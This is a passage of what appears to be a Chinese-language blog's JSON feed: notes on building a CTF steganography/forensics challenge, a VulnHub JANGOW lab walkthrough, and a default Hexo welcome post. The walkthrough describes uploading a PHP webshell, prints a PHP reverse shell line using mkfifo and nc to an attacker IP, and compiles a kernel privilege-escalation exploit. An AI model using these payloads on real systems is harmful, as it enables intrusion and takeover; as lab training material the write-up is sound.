punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>math<span class=\"token punctuation\">.</span>sqrt<span class=\"token punctuation\">(</span><span class=\"token number\">48432</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token number\">221</span><span class=\"token operator\">*</span><span class=\"token number\">221</span><span class=\"token operator\">-</span><span class=\"token number\">48432</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># print(long_to_bytes(int(a,2)))</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>a<span class=\"token operator\">=</span><span class=\"token string\">'0'</span><span class=\"token operator\">*</span><span class=\"token number\">409</span><span class=\"token operator\">+</span>a</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>MAX <span class=\"token operator\">=</span> <span class=\"token number\">221</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>img <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span><span class=\"token string\">\"RGB\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>MAX<span class=\"token punctuation\">,</span>MAX<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>str1 <span class=\"token operator\">=</span> a</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>i<span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">[</span><span class=\"token number\">53</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'index.txt'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'w'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">for</span> y <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>MAX<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>MAX<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token comment\"># print(i)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token comment\"># print(str1)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                img<span class=\"token punctuation\">.</span>putpixel<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                str2<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">','</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>str2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                img<span class=\"token punctuation\">.</span>putpixel<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            i <span class=\"token operator\">=</span> i<span class=\"token operator\">+</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\"># img.show()</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>img<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">\"1.png\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这边是给了一个 hint 的，就是梅花香自苦寒来，这算是我第一个接触 python 写脚本的题目吧，buu 上比较靠前的一个 misc 题的（不知道师傅们能不能理解，如果不能理解的话给大家磕个头了）解题脚本就不给了，网上搜一搜就有了</p>\n<h3 id=\"flagpng-oursecret-秘钥lsb\"><a class=\"anchor\" href=\"#flagpng-oursecret-秘钥lsb\">#</a> flag.png oursecret    秘钥：lsb</h3>\n<p>一个 oursecret，藏文件，经典，秘钥就藏在 lsb 里面了</p>\n<pre><code>藏坐标 index.txt\n</code></pre>\n<p>秘钥 isctfgood</p>\n<p>然后再进行一次百度网盘缩小</p>\n<p>百度网盘<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMVFqRnIwOWE3WFJTNUo3WlhBUGJKc1E/cHdkPXRwZGU=\"> https://pan.baidu.com/s/1QjFr09a7XRS5J7ZXAPbJsQ?pwd=tpde</span></p>\n<h3 id=\"slienteye-秘钥\"><a class=\"anchor\" href=\"#slienteye-秘钥\">#</a> slienteye  秘钥</h3>\n<p>将链接藏在一个 jpg 文件中</p>\n<p>这边在出题的时候发现了一个很神奇的现象（之后再去研究研究，有懂的师傅可以告诉我呜呜）</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/6569cb4c9ffd424f9ce41ee0c14bc569.png\" alt=\"\" /></p>\n<p>秘钥就是 jpg 图片改宽高，这个考点不是很常见，所以也给了 hint，但是不能改差，改出错了会导致 slienteye 读不出来数据了</p>\n<h3 id=\"ftp文件传输流量\"><a class=\"anchor\" href=\"#ftp文件传输流量\">#</a> ftp 文件传输流量</h3>\n<p>简单的套一层流量，水平有限，并且考虑到比赛新生难度，也是没有出的很奇怪，直接导出数据就可以了</p>\n<h3 id=\"套个取证desktop压缩包-压缩包密码是开机密码\"><a class=\"anchor\" href=\"#套个取证desktop压缩包-压缩包密码是开机密码\">#</a> 套个取证，desktop 压缩包   压缩包密码是开机，密码</h3>\n<p>这边就是最开始了地方了，一个找取证的密码，一个 filescan。</p>\n<h3 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h3>\n<p>个人感觉还是搜一搜，可以做的，emmmm，给大家磕一个</p>\n",
            "tags": [
                "MISC",
                "出题记录"
            ]
        },
        {
            "id": "https://dr34nn.github.io/2022/07/06/vulnhub-JANGOW/",
            "url": "https://dr34nn.github.io/2022/07/06/vulnhub-JANGOW/",
            "title": "JANGOW",
            "date_published": "2022-07-05T16:00:00.000Z",
            "content_html": "<p>首先配置一下虚拟机，因为 ova 格式用 VM 导入的话，是不显示 ip 的，具体配置网上都有，这里就不说了</p>\n<p>配置成功后，在本机上使用 arp-scan -l 就可以看到靶机 ip (用来验证是否配置成功)</p>\n<p><img data-src=\"https://s2.loli.net/2022/07/06/6f19y7LDuT8KMZQ.png\" alt=\"image-20220706180938973\" /></p>\n<p>端口扫描</p>\n<p><img data-src=\"https://s2.loli.net/2022/07/06/D5f1rEh8AxVond2.png\" alt=\"image-20220706173442839\" /></p>\n<p>开放了 80 端口，所以直接访问看看，点点点，就发现可疑接口</p>\n<p><img data-src=\"https://s2.loli.net/2022/07/06/oSWHbsaAE8YtzDc.png\" alt=\"image-20220706173524813\" /></p>\n<p>写个一句话木马传上去，蚁剑连</p>\n<p><img data-src=\"https://s2.loli.net/2022/07/06/XeMdtG5NIQZiV4F.png\" alt=\"image-20220706173618962\" /></p>\n<p>再 WordPress 下面发现配置文件</p>\n<p><img data-src=\"https://s2.loli.net/2022/07/06/Uo3f9mk6wqplRa8.png\" alt=\"image-20220706173707830\" /></p>\n<p>在 /var/www/html 下有个.backup 文件</p>\n<p><img data-src=\"https://s2.loli.net/2022/07/06/mVCSTAijWdMaODt.png\" alt=\"image-20220706173832888\" /></p>\n<p>然后尝试登录系统，但是并没有发现什么有用的东西，先写个反弹 shell 吧</p>\n<p><img data-src=\"https://s2.loli.net/2022/07/06/UKu5WPpTQcYaJ2i.png\" alt=\"image-20220706174421828\" /></p>\n<pre><code>&lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.248.129 443 &gt;/tmp/f&quot;);?&gt;\n</code></pre>\n<p><img data-src=\"https://s2.loli.net/2022/07/06/KUhCFndli5TceAI.png\" alt=\"image-20220706175349190\" /></p>\n<p>kali 本地监听 443 端口，浏览器访问刚才创建的反弹 shell 的文件 2.php<br />\n 出现下图界面即为反弹成功</p>\n<p><img data-src=\"https://s2.loli.net/2022/07/06/DwHCPnhxFMty9Tk.png\" alt=\"image-20220706175448414\" /></p>\n<p>升级 tty shell</p>\n<pre><code>python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'\n</code></pre>\n<p><img data-src=\"https://s2.loli.net/2022/07/06/c9E5eHlkqLiSswC.png\" alt=\"image-20220706175721981\" /></p>\n<p>查看一下内核版本</p>\n<p><img data-src=\"https://s2.loli.net/2022/07/06/9bwqlPt4vmXZGQH.png\" alt=\"image-20220706175824793\" /></p>\n<p>在 kali 里找一下有没有该版本的漏洞信息，果然发现</p>\n<p><img data-src=\"https://s2.loli.net/2022/07/06/itW6IpjKSJ2dcXu.png\" alt=\"image-20220706175910491\" /></p>\n<p>使用命令，把 <code>.c</code>  文件下下来，然后直接在本地 <code>gcc 45010.c -o exp</code></p>\n<p><img data-src=\"https://s2.loli.net/2022/07/06/q8GlWNxzikMnAmH.png\" alt=\"image-20220706180048930\" /></p>\n<p>编译完成以后我们通过 ftp 服务上传到靶机中</p>\n<p><img data-src=\"https://s2.loli.net/2022/07/06/Cx4izEsfWOLHtIZ.png\" alt=\"image-20220706180304820\" /></p>\n<p>再回到靶机那边，给 exp 权限，最后提权成功</p>\n<p><img data-src=\"https://s2.loli.net/2022/07/06/SwEB1lrnDcF9KO7.png\" alt=\"image-20220706180656881\" /></p>\n<p>进入 root 目录下，发现第二个 flag</p>\n<p><img data-src=\"https://s2.loli.net/2022/07/06/mobxRfqedOJH6hY.png\" alt=\"image-20220706180751632\" /></p>\n",
            "tags": [
                "内网",
                "vulnhub"
            ]
        },
        {
            "id": "https://dr34nn.github.io/2022/07/05/hello-world/",
            "url": "https://dr34nn.github.io/2022/07/05/hello-world/",
            "title": "Hello World",
            "date_published": "2022-07-05T08:03:35.841Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo new <span class=\"token string\">\"My New Post\"</span></pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo server</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo generate</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo deploy</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": []
        }
    ]
}